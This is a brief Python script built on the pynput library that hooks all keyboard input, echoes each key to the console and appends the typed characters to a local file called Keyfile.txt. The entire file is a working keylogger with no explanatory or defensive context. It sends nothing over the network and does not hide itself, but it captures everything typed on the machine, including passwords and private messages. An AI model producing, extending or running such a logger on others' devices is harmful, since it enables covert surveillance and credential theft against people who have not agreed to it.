from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("Keyfile.txt", "a") as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error Getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()